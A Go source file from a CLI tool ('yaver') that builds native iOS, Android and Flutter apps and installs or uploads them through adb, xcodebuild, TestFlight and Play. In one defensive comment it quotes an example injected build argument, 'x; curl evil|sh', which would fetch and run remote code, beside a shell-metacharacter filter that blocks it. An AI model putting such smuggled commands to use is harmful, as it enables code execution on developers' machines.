package main

// Native build & deploy — friendly entrypoints for pushing native iOS Swift,
// native Android Kotlin, and Flutter apps from a headless dev machine to a
// connected device, simulator/emulator, TestFlight, or Play Store.
//
// This file is the back-end for `yaver iosNative` / `yaver androidNative` /
// `yaver flutter`, the matching `/builds` POST aliases (`platform`:
// "iosNative" | "androidNative" | "flutter" with a `target` field), and is
// also surfaced through the existing build_http.go path so mobile, web, and
// MCP all hit one orchestration. React Native + Hermes paths are untouched.

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// Friendly native platform names accepted by the CLI and /builds POST.
const (
	NativeIOS     = "iosNative"
	NativeAndroid = "androidNative"
	NativeFlutter = "flutter"
)

// New BuildPlatform constants for device-install paths that didn't exist yet.
// Keep the existing PlatformXcodeDeviceInstall as the iOS counterpart.
const (
	PlatformGradleDeviceInstall  BuildPlatform = "gradle-device-install"
	PlatformFlutterDeviceInstall BuildPlatform = "flutter-device-install"
)

// resolveNativePlatform maps (native alias, target) to the concrete BuildPlatform
// the existing build pipeline knows how to run.
//
// Targets:
//   - device     → install on a connected USB/WiFi device (xcrun devicectl / adb / flutter)
//   - simulator  → simulator/emulator install (currently same path as device for adb;
//     for iOS this falls back to a generic xcodebuild)
//   - testflight → build IPA for App Store Connect upload (use `yaver build push testflight`)
//   - playstore  → build AAB for Play Store upload (use `yaver build push playstore`)
//   - local      → just produce the artifact, no install or upload
func resolveNativePlatform(native, target string) (BuildPlatform, error) {
	if target == "" {
		target = "device"
	}
	target = strings.ToLower(target)
	switch native {
	case NativeIOS, "ios-native", "ios":
		switch target {
		case "device":
			return PlatformXcodeDeviceInstall, nil
		case "simulator", "sim":
			return PlatformXcodeBuild, nil
		case "testflight", "ipa", "local":
			return PlatformXcodeIPA, nil
		}
	case NativeAndroid, "android-native", "android":
		switch target {
		case "device", "emulator", "emu", "simulator", "sim":
			return PlatformGradleDeviceInstall, nil
		case "playstore", "aab":
			return PlatformGradleAAB, nil
		case "apk", "local":
			return PlatformGradleAPK, nil
		}
	case NativeFlutter:
		switch target {
		case "device", "emulator", "emu", "simulator", "sim":
			return PlatformFlutterDeviceInstall, nil
		case "ios", "ipa", "testflight":
			return PlatformFlutterIPA, nil
		case "playstore", "aab":
			return PlatformFlutterAAB, nil
		case "apk", "local":
			return PlatformFlutterAPK, nil
		}
	}
	return "", fmt.Errorf("unsupported native combo: platform=%q target=%q "+
		"(valid platforms: iosNative, androidNative, flutter)", native, target)
}

// dispatchDeviceInstall picks the right device-install path based on platform
// and the artifact extension. Called from BuildManager.monitorBuild after a
// successful build when InstallOnDevice == true.
func dispatchDeviceInstall(ctx context.Context, platform BuildPlatform, artifactPath string) (deviceID string, err error) {
	switch platform {
	case PlatformXcodeDeviceInstall:
		return installAppOnDevice(ctx, artifactPath)
	}

	// Heuristic: choose by artifact extension so Flutter / Gradle / .apk all flow
	// through the same adb path without needing extra constants.
	lower := strings.ToLower(artifactPath)
	switch {
	case strings.HasSuffix(lower, ".apk"):
		return installAPKOnAndroidDevice(ctx, artifactPath)
	case strings.HasSuffix(lower, ".aab"):
		return "", fmt.Errorf(".aab cannot be installed directly — use --target=playstore to upload, or build an .apk for device install")
	case strings.HasSuffix(lower, ".app"):
		return installAppOnDevice(ctx, artifactPath)
	case strings.HasSuffix(lower, ".ipa"):
		return "", fmt.Errorf(".ipa device install requires Apple Configurator or `xcrun devicectl install` with a signed IPA — try --target=device on a .app or push via TestFlight")
	}
	return "", fmt.Errorf("no device-install path for platform %s (artifact %s)", platform, filepath.Base(artifactPath))
}

// dispatchAutoLaunch tries to launch the just-installed app on the device so
// "Open App" actually opens it. Best-effort — failure here doesn't fail the build.
func dispatchAutoLaunch(ctx context.Context, platform BuildPlatform, deviceID, artifactPath string) error {
	lower := strings.ToLower(artifactPath)
	switch {
	case strings.HasSuffix(lower, ".app"):
		bundleID := readBundleIDFromApp(artifactPath)
		if bundleID == "" {
			return fmt.Errorf("could not read CFBundleIdentifier from %s", artifactPath)
		}
		return launchAppOnDevice(ctx, deviceID, bundleID)
	case strings.HasSuffix(lower, ".apk"):
		return launchAPKOnAndroidDevice(ctx, deviceID, artifactPath)
	}
	return nil
}

// installAPKOnAndroidDevice runs `adb install -r -t` against the first online
// device returned by `adb devices`. Returns the device serial.
func installAPKOnAndroidDevice(ctx context.Context, apkPath string) (string, error) {
	if _, err := exec.LookPath("adb"); err != nil {
		return "", fmt.Errorf("adb not found — install Android platform-tools (brew install android-platform-tools) to enable native Android device install")
	}
	serial, err := detectAndroidDevice(ctx)
	if err != nil {
		return "", err
	}
	if serial == "" {
		return "", fmt.Errorf("no Android device detected — connect a device with USB debugging enabled, or boot an emulator")
	}
	cmd := exec.CommandContext(ctx, "adb", "-s", serial, "install", "-r", "-t", apkPath)
	if out, err := cmd.CombinedOutput(); err != nil {
		return serial, fmt.Errorf("adb install failed: %v\n%s", err, strings.TrimSpace(string(out)))
	}
	return serial, nil
}

// launchAPKOnAndroidDevice starts the launcher activity declared by the APK's
// manifest. Uses aapt2/aapt to read the package + activity.
func launchAPKOnAndroidDevice(ctx context.Context, serial, apkPath string) error {
	pkg, activity := readAndroidLaunchInfo(apkPath)
	if pkg == "" {
		return fmt.Errorf("could not determine Android package from %s — is aapt2 installed?", apkPath)
	}
	target := pkg
	if activity != "" {
		target = pkg + "/" + activity
	}
	cmd := exec.CommandContext(ctx, "adb", "-s", serial, "shell", "am", "start", "-n", target)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("adb am start failed: %v\n%s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// detectAndroidDevice returns the first online "device" from `adb devices`.
// Returns ("", nil) when no device is attached so callers can produce a friendly error.
func detectAndroidDevice(ctx context.Context) (string, error) {
	if _, err := exec.LookPath("adb"); err != nil {
		return "", fmt.Errorf("adb not found — install Android platform-tools")
	}
	out, err := exec.CommandContext(ctx, "adb", "devices").Output()
	if err != nil {
		return "", fmt.Errorf("adb devices failed: %w", err)
	}
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "List of devices") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) >= 2 && fields[1] == "device" {
			return fields[0], nil
		}
	}
	return "", nil
}

var (
	aaptPackageRe  = regexp.MustCompile(`package: name='([^']+)'`)
	aaptActivityRe = regexp.MustCompile(`launchable-activity: name='([^']+)'`)
)

// readAndroidLaunchInfo extracts (package, launcher activity) from an APK by
// running `aapt2 dump badging` (preferred) or falling back to `aapt`.
func readAndroidLaunchInfo(apkPath string) (pkg, activity string) {
	var out []byte
	if _, err := exec.LookPath("aapt2"); err == nil {
		out, _ = exec.Command("aapt2", "dump", "badging", apkPath).Output()
	}
	if len(out) == 0 {
		if _, err := exec.LookPath("aapt"); err == nil {
			out, _ = exec.Command("aapt", "dump", "badging", apkPath).Output()
		}
	}
	if m := aaptPackageRe.FindStringSubmatch(string(out)); len(m) >= 2 {
		pkg = m[1]
	}
	if m := aaptActivityRe.FindStringSubmatch(string(out)); len(m) >= 2 {
		activity = m[1]
	}
	return
}

// resolveNativeBuildCommand handles the two new BuildPlatform constants this
// file introduces. Called from resolveBuildCommand in builds.go via fallthrough.
func resolveNativeBuildCommand(platform BuildPlatform, workDir string, extraArgs []string) (command string, artifactPatterns []string, ok bool) {
	// The resolved command is later run through `sh -c`, and extraArgs (build
	// scheme/flavor/task, possibly composed from untrusted project metadata by
	// an LLM) is spliced into that string. Refuse any element carrying shell
	// metacharacters so `{"scheme":"x; curl evil|sh"}` cannot execute — legit
	// build args are plain identifiers/flags (assembleRelease, --flavor=prod).
	for _, a := range extraArgs {
		if strings.ContainsAny(a, ";&|<>$`\n\r(){}!*?\\\"'") {
			return "", nil, false
		}
	}
	extra := strings.Join(extraArgs, " ")
	if extra != "" {
		extra = " " + extra
	}
	switch platform {
	case PlatformGradleDeviceInstall:
		// Build a debuggable APK so it actually installs on a real device
		// without Play Store signing. assembleDebug is what the Android
		// Studio Run button does under the hood.
		gradlew := "./gradlew"
		if _, err := os.Stat(filepath.Join(workDir, "gradlew")); err != nil {
			gradlew = "gradle"
		}
		task := "assembleDebug"
		if extra != "" {
			task = strings.TrimSpace(extra)
			extra = ""
		}
		return fmt.Sprintf("JAVA_HOME=%s %s %s", findJavaHome(), gradlew, task), []string{
			"app/build/outputs/apk/debug/*.apk",
			"app/build/outputs/apk/release/*.apk",
		}, true

	case PlatformFlutterDeviceInstall:
		// Flutter has its own device picker — `flutter build apk --debug`
		// produces an APK we can adb-install onto whichever device is attached.
		// Native Android only here; iOS device install for Flutter projects
		// goes through PlatformXcodeDeviceInstall when invoked with
		// --target=device on an iOS-only project (caller resolves).
		return "flutter build apk --debug" + extra, []string{
			"build/app/outputs/flutter-apk/app-debug.apk",
			"build/app/outputs/flutter-apk/app-release.apk",
		}, true
	}
	return "", nil, false
}

// runNativeIOS / runNativeAndroid / runNativeFlutter — top-level CLI entrypoints
// wired in main.go's switch cmd block. All three share the same flag surface.
func runNativeIOS(args []string)     { runNativeBuild(NativeIOS, args) }
func runNativeAndroid(args []string) { runNativeBuild(NativeAndroid, args) }
func runNativeFlutter(args []string) { runNativeBuild(NativeFlutter, args) }

type nativeProjectCandidate struct {
	Path  string `json:"path"`
	Stack string `json:"stack"`
}

type ambiguousNativeProjectError struct {
	Native     string
	StartDir   string
	Candidates []nativeProjectCandidate
}

func (e *ambiguousNativeProjectError) Error() string {
	var b strings.Builder
	fmt.Fprintf(&b, "multiple %s mobile projects found under %s", nativeLabel(e.Native), e.StartDir)
	for _, c := range e.Candidates {
		fmt.Fprintf(&b, "\n  - %s (%s)", c.Path, c.Stack)
	}
	return b.String()
}

func nativeLabel(native string) string {
	switch native {
	case NativeIOS, "ios-native", "ios":
		return "iOS"
	case NativeAndroid, "android-native", "android":
		return "Android"
	case NativeFlutter:
		return "Flutter"
	default:
		return native
	}
}

func nativeBuildTargetForCommand(native string) string {
	switch native {
	case NativeIOS, "ios-native", "ios":
		return "testflight"
	case NativeAndroid, "android-native", "android":
		return "playstore"
	default:
		return "local"
	}
}

func nativePushTargetForCommand(native string) string {
	return nativeBuildTargetForCommand(native)
}

func releasePlatformForCandidate(native, stack string) (BuildPlatform, error) {
	switch native {
	case NativeIOS, "ios-native", "ios":
		switch stack {
		case "flutter":
			return PlatformFlutterIPA, nil
		case "expo", "react-native", "native-ios":
			return PlatformXcodeIPA, nil
		}
	case NativeAndroid, "android-native", "android":
		switch stack {
		case "flutter":
			return PlatformFlutterAAB, nil
		case "expo", "react-native", "native-android":
			return PlatformGradleAAB, nil
		}
	}
	return "", fmt.Errorf("no release builder for %s project stack %s", nativeLabel(native), stack)
}

func nativeProjectMatches(native, stack string) bool {
	switch native {
	case NativeIOS, "ios-native", "ios":
		return stack == "expo" || stack == "react-native" || stack == "flutter" || stack == "native-ios"
	case NativeAndroid, "android-native", "android":
		return stack == "expo" || stack == "react-native" || stack == "flutter" || stack == "native-android"
	case NativeFlutter:
		return stack == "flutter"
	default:
		return false
	}
}

func yaverRepoMobileDir(start string) string {
	root, err := gitOutput(start, "rev-parse", "--show-toplevel")
	if err != nil || strings.TrimSpace(root) == "" {
		return ""
	}
	detected := detectRepoRemoteFromGit(start)
	if !strings.EqualFold(detected.Host, "github.com") || !strings.EqualFold(detected.Repo, "kivanccakmak/yaver.io") {
		return ""
	}
	mobileDir := filepath.Join(root, "mobile")
	if !wireExists(mobileDir) {
		return ""
	}
	return mobileDir
}

func discoverNativeProjectCandidates(start, native string) []nativeProjectCandidate {
	start = strings.TrimSpace(start)
	if start == "" {
		start = "."
	}
	candidates := []string{start}
	if mobileDir := yaverRepoMobileDir(start); mobileDir != "" {
		candidates = append(candidates, mobileDir)
	}
	if detectMobileStack(start) == "" {
		candidates = append(candidates,
			filepath.Join(start, "mobile"),
			filepath.Join(start, "app"),
		)
		for _, parent := range []string{"apps", "packages"} {
			entries, err := os.ReadDir(filepath.Join(start, parent))
			if err != nil {
				continue
			}
			for _, e := range entries {
				if e.IsDir() {
					candidates = append(candidates, filepath.Join(start, parent, e.Name()))
				}
			}
		}
	}
	seen := map[string]bool{}
	var hits []nativeProjectCandidate
	for _, c := range candidates {
		if !wireExists(c) {
			continue
		}
		abs, err := filepath.Abs(c)
		if err != nil {
			continue
		}
		if seen[abs] {
			continue
		}
		seen[abs] = true
		stack := detectMobileStack(abs)
		if stack == "" || !nativeProjectMatches(native, stack) {
			continue
		}
		hits = append(hits, nativeProjectCandidate{Path: abs, Stack: stack})
	}
	return hits
}

func canPromptNativeSelection() bool {
	fi, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	return (fi.Mode() & os.ModeCharDevice) != 0
}

func promptNativeProjectSelection(native string, hits []nativeProjectCandidate) (nativeProjectCandidate, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Fprintf(os.Stderr, "Multiple %s projects found. Select one:\n", nativeLabel(native))
	for i, hit := range hits {
		fmt.Fprintf(os.Stderr, "  %d. %s (%s)\n", i+1, hit.Path, hit.Stack)
	}
	fmt.Fprintf(os.Stderr, "Enter 1-%d: ", len(hits))
	line, err := reader.ReadString('\n')
	if err != nil {
		return nativeProjectCandidate{}, err
	}
	choice, err := strconv.Atoi(strings.TrimSpace(line))
	if err != nil || choice < 1 || choice > len(hits) {
		return nativeProjectCandidate{}, fmt.Errorf("invalid selection %q", strings.TrimSpace(line))
	}
	return hits[choice-1], nil
}

func resolveNativeProject(start, native string, allowPrompt bool) (nativeProjectCandidate, error) {
	hits := discoverNativeProjectCandidates(start, native)
	if len(hits) == 0 {
		return nativeProjectCandidate{}, fmt.Errorf("no %s mobile project detected under %s", nativeLabel(native), start)
	}
	if len(hits) == 1 {
		return hits[0], nil
	}
	if allowPrompt && canPromptNativeSelection() {
		return promptNativeProjectSelection(native, hits)
	}
	return nativeProjectCandidate{}, &ambiguousNativeProjectError{
		Native:     native,
		StartDir:   start,
		Candidates: hits,
	}
}

func startNativeBuildFromDir(native, target, startDir string, extra []string, install bool, allowPrompt bool) (*Build, nativeProjectCandidate, error) {
	candidate, err := resolveNativeProject(startDir, native, allowPrompt)
	if err != nil {
		return nil, nativeProjectCandidate{}, err
	}
	platform, err := resolveNativePlatform(native, target)
	if err != nil {
		return nil, nativeProjectCandidate{}, err
	}
	body := map[string]interface{}{
		"platform":        string(platform),
		"workDir":         candidate.Path,
		"args":            extra,
		"installOnDevice": install,
	}
	resp, err := localAgentRequest("POST", "/builds", body)
	if err != nil {
		return nil, nativeProjectCandidate{}, fmt.Errorf("start build: %w", err)
	}
	var build Build
	if err := remarshal(resp, &build); err != nil {
		return nil, nativeProjectCandidate{}, fmt.Errorf("parse build response: %w", err)
	}
	return &build, candidate, nil
}

func startNativeReleaseBuildFromDir(native, startDir string, extra []string, allowPrompt bool) (*Build, nativeProjectCandidate, error) {
	candidate, err := resolveNativeProject(startDir, native, allowPrompt)
	if err != nil {
		return nil, nativeProjectCandidate{}, err
	}
	platform, err := releasePlatformForCandidate(native, candidate.Stack)
	if err != nil {
		return nil, nativeProjectCandidate{}, err
	}
	body := map[string]interface{}{
		"platform": platform,
		"workDir":  candidate.Path,
		"args":     extra,
	}
	resp, err := localAgentRequest("POST", "/builds", body)
	if err != nil {
		return nil, nativeProjectCandidate{}, fmt.Errorf("start release build: %w", err)
	}
	var build Build
	if err := remarshal(resp, &build); err != nil {
		return nil, nativeProjectCandidate{}, fmt.Errorf("parse build response: %w", err)
	}
	return &build, candidate, nil
}

func waitForBuildCompletion(buildID string) (*Build, error) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	lastLine := ""
	for {
		resp, err := localAgentRequest("GET", "/builds/"+buildID, nil)
		if err != nil {
			return nil, err
		}
		var build Build
		if err := remarshal(resp, &build); err != nil {
			return nil, err
		}
		line := fmt.Sprintf("status=%s", build.Status)
		if build.ArtifactName != "" {
			line += fmt.Sprintf(" artifact=%s", build.ArtifactName)
		}
		if build.InstallStatus != "" {
			line += fmt.Sprintf(" install=%s", build.InstallStatus)
		}
		if line != lastLine {
			fmt.Println(line)
			lastLine = line
		}
		switch build.Status {
		case BuildStatusCompleted, BuildStatusFailed, BuildStatusCancelled:
			return &build, nil
		}
		<-ticker.C
	}
}

func runNativeBuild(native string, args []string) {
	fs := flag.NewFlagSet("native "+native, flag.ExitOnError)
	target := fs.String("target", "device", "Build target: device | simulator | testflight | playstore | local")
	dir := fs.String("dir", "", "Repo or project directory to scan (defaults to cwd or first positional arg)")
	scheme := fs.String("scheme", "", "Xcode scheme override (iosNative only)")
	flavor := fs.String("flavor", "", "Gradle task / product flavor override (androidNative only)")
	install := fs.Bool("install", true, "Install on connected device when --target=device")
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage:\n  yaver %s [repo-or-project-dir] [--target=<device|simulator|testflight|playstore|local>]\n\nFlags:\n", native)
		fs.PrintDefaults()
	}
	_ = fs.Parse(args)

	workDir := *dir
	if workDir == "" && fs.NArg() > 0 {
		workDir = fs.Arg(0)
	}
	if workDir == "" {
		cwd, _ := os.Getwd()
		workDir = cwd
	}

	extra := []string{}
	switch native {
	case NativeIOS:
		if *scheme != "" {
			extra = append(extra, *scheme)
		}
	case NativeAndroid:
		if *flavor != "" {
			extra = append(extra, *flavor)
		}
	}
	if fs.NArg() > 1 {
		extra = append(extra, fs.Args()[1:]...)
	}
	build, candidate, err := startNativeBuildFromDir(native, *target, workDir, extra, *install && (*target == "device" || *target == "simulator" || *target == "emulator"), true)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\nIs the agent running? Start with 'yaver serve'.\n", err)
		os.Exit(1)
	}

	fmt.Printf("Native build started: %s --target=%s\n", native, *target)
	fmt.Printf("  Build ID: %s\n", build.ID)
	fmt.Printf("  Platform: %s\n", build.Platform)
	fmt.Printf("  Project:  %s (%s)\n", candidate.Path, candidate.Stack)
	fmt.Printf("  Command:  %s\n", build.Command)
	fmt.Println()
	fmt.Printf("  yaver build status %s    Check status\n", build.ID)
	fmt.Printf("  yaver logs                 View build output\n")
	switch *target {
	case "testflight":
		fmt.Printf("  yaver build push testflight %s   Upload IPA after build completes\n", build.ID)
	case "playstore":
		fmt.Printf("  yaver build push playstore %s    Upload AAB after build completes\n", build.ID)
	}
}

func runNativeReleasePush(native string, args []string) {
	fs := flag.NewFlagSet("push "+native, flag.ExitOnError)
	dir := fs.String("dir", "", "Repo or project directory to scan (defaults to cwd or first positional arg)")
	scheme := fs.String("scheme", "", "Xcode scheme override (ios only)")
	flavor := fs.String("flavor", "", "Gradle task / product flavor override (android only)")
	_ = fs.Parse(args)

	startDir := *dir
	if startDir == "" && fs.NArg() > 0 {
		startDir = fs.Arg(0)
	}
	if startDir == "" {
		cwd, _ := os.Getwd()
		startDir = cwd
	}

	extra := []string{}
	if native == NativeIOS && *scheme != "" {
		extra = append(extra, *scheme)
	}
	if native == NativeAndroid && *flavor != "" {
		extra = append(extra, *flavor)
	}
	if fs.NArg() > 1 {
		extra = append(extra, fs.Args()[1:]...)
	}

	build, candidate, err := startNativeReleaseBuildFromDir(native, startDir, extra, true)
	if err != nil {
		fmt.Fprintf(os.Stderr, "push %s: %v\n", native, err)
		os.Exit(1)
	}

	fmt.Printf("Started %s release build %s for %s (%s)\n", nativeLabel(native), build.ID, candidate.Path, candidate.Stack)
	finalBuild, err := waitForBuildCompletion(build.ID)
	if err != nil {
		fmt.Fprintf(os.Stderr, "wait for build %s: %v\n", build.ID, err)
		os.Exit(1)
	}
	if finalBuild.Status != BuildStatusCompleted || strings.TrimSpace(finalBuild.ArtifactPath) == "" {
		fmt.Fprintf(os.Stderr, "%s build failed: %s\n", nativeLabel(native), firstNonEmpty(finalBuild.Error, string(finalBuild.Status)))
		os.Exit(1)
	}

	switch native {
	case NativeIOS:
		fmt.Printf("Uploading %s to TestFlight...\n", finalBuild.ArtifactPath)
		if err := uploadToTestFlight(finalBuild.ArtifactPath); err != nil {
			fmt.Fprintf(os.Stderr, "TestFlight upload failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("TestFlight upload complete.")
	case NativeAndroid:
		fmt.Printf("Uploading %s to Google Play internal testing...\n", finalBuild.ArtifactPath)
		if err := uploadToPlayStore(finalBuild.ArtifactPath); err != nil {
			fmt.Fprintf(os.Stderr, "Play upload failed: %v\n", err)
			os.Exit(1)
		}
		fmt.Println("Google Play internal testing upload complete.")
	default:
		fmt.Fprintf(os.Stderr, "unsupported push target: %s\n", native)
		os.Exit(1)
	}
}

func runNativeReleaseBuild(native string, args []string) {
	fs := flag.NewFlagSet("build "+native, flag.ExitOnError)
	dir := fs.String("dir", "", "Repo or project directory to scan (defaults to cwd or first positional arg)")
	scheme := fs.String("scheme", "", "Xcode scheme override (iOS only)")
	flavor := fs.String("flavor", "", "Gradle flavor/task override (Android only)")
	_ = fs.Parse(args)

	startDir := *dir
	if startDir == "" && fs.NArg() > 0 {
		startDir = fs.Arg(0)
	}
	if startDir == "" {
		cwd, _ := os.Getwd()
		startDir = cwd
	}

	extra := []string{}
	if native == NativeIOS && *scheme != "" {
		extra = append(extra, *scheme)
	}
	if native == NativeAndroid && *flavor != "" {
		extra = append(extra, *flavor)
	}
	if fs.NArg() > 1 {
		extra = append(extra, fs.Args()[1:]...)
	}

	build, candidate, err := startNativeReleaseBuildFromDir(native, startDir, extra, true)
	if err != nil {
		fmt.Fprintf(os.Stderr, "build %s: %v\n", native, err)
		os.Exit(1)
	}
	c := buildUseColor()
	fmt.Printf("%s %s\n", tcol(c, cyanCode, "●"), tcol(c, cyanCode, fmt.Sprintf("%s release build %s started", nativeLabel(native), build.ID)))
	fmt.Printf("  %s\n", tcol(c, dimCode, friendlyPlatform(build.Platform)))
	fmt.Println()
	fmt.Printf("  Project   %s (%s)\n", candidate.Path, candidate.Stack)
	fmt.Printf("  Command   %s\n", build.Command)
	fmt.Println()
	fmt.Println("  Runs in the background on this machine. Track it with:")
	fmt.Printf("    %s   progress, log tail, artifact\n", tcol(c, dimCode, "yaver build status "+build.ID))
	fmt.Printf("    %s                       stream full build output\n", tcol(c, dimCode, "yaver logs"))
}
